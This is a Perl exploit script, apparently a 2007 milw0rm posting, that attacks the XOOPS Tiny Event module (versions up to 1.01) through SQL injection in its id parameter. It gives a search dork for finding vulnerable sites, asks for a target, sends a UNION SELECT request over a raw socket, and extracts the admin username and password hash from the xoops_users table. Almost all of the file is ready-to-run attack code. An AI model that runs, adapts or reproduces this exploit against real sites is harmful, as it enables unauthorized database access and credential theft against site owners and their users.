#!/usr/bin/perl
#[Script Name: XOOPS Module Tiny Event <= 1.01 (id) Remote BLIND SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
#[Dork       : inurl:/modules/tinyevent/
#[S.Page     : http://www.chapi.de/
#[$$         : ?? 
#[..         : ajann,Turkey


use IO::Socket;
if(@ARGV < 1){
print "
[========================================================================
[//  XOOPS Module Tiny Event <= 1.01 (id) Remote BLIND SQL Injection Exploit
[//                   Usage: exploit.pl [target]
[//                   Example: exploit.pl victim.com
[//                   Example: exploit.pl victim.com
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$kapan = "/*";
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/modules/tinyevent/index.php?op=show&id=";

print "Script <DIR> : ";
$dir = <STDIN>;
chop ($dir);

if ($dir =~ /exit/){
print "-- Exploit Failed[You Are Exited] \n";
exit();
}

if ($dir =~ /\//){}
else {
print "-- Exploit Failed[No DIR] \n";
exit();
 }

print "User ID (uid): ";
$id = <STDIN>;
chop ($id);

$target = "999999%20union%20select%201,2,3,4,concat(char(117,115,101,114,110,97,109,101,45,45),uname,char(112,97,115,115,119,111,114,100,45,45),pass)%20from%20xoops_users%20where%20uid%20like%20".$id.$kapan;
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /username--(.*?)pass/){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ /password--(.*?)<\/td>/){
print "+ Password: $1\n";
}

if ($answer =~ /Syntax error/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }

# milw0rm.com [2007-04-01]
